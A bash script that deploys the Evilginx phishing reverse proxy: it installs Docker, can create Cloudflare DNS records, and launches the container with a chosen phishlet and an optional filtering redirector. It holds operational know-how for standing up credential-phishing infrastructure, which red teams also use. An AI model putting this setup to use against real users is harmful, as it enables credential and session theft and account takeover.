#!/bin/bash
# ============================================
# Full deployment: DNS + Build + Launch
# ============================================
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="${SCRIPT_DIR}/.."

cd "${PROJECT_DIR}"

# Check .env exists
if [ ! -f .env ]; then
    echo "[!] .env file not found. Copy .env.example to .env and fill in your values."
    exit 1
fi

source .env

# Check Docker is installed; install if missing
if ! command -v docker &>/dev/null; then
    echo "[!] Docker not found. Installing..."
    apt-get update -qq
    apt-get install -y ca-certificates curl gnupg
    install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    chmod a+r /etc/apt/keyrings/docker.gpg
    echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" \
        > /etc/apt/sources.list.d/docker.list
    apt-get update -qq
    apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    systemctl enable --now docker
    echo "[+] Docker installed"
fi

# Verify docker compose subcommand exists
if ! docker compose version &>/dev/null; then
    echo "[!] 'docker compose' not available. Install docker-compose-plugin."
    exit 1
fi

echo "==========================================="
echo " Evilginx Deployment"
echo " Domain:   ${BASE_DOMAIN}"
echo " IP:       ${SERVER_IP}"
echo " Phishlet: ${PHISHLET_NAME}"
echo "==========================================="
echo ""

# Step 1: DNS setup (optional — skip if records already exist)
read -p "[?] Set up DNS records via Cloudflare? (y/N): " dns_choice
if [ "${dns_choice}" = "y" ] || [ "${dns_choice}" = "Y" ]; then
    bash "${SCRIPT_DIR}/dns-setup.sh"
    echo "[*] Waiting 30s for DNS propagation..."
    sleep 30
fi

# Step 2: Stop any existing containers
echo "[*] Cleaning up existing containers..."
docker compose down 2>/dev/null || true

# Step 3: Build and launch
echo "[*] Building and starting Evilginx..."
COMPOSE_PROFILES=""
read -p "[?] Include filtering redirector? (y/N): " redir_choice
if [ "${redir_choice}" = "y" ] || [ "${redir_choice}" = "Y" ]; then
    COMPOSE_PROFILES="--profile with-redirector"
fi

docker compose ${COMPOSE_PROFILES} up -d --build

echo ""
echo "[+] Deployment complete!"
echo "[*] Logs: docker compose logs -f evilginx"
echo "[*] Shell: docker exec -it evilginx /bin/bash"
echo "[*] Teardown: bash scripts/teardown.sh"
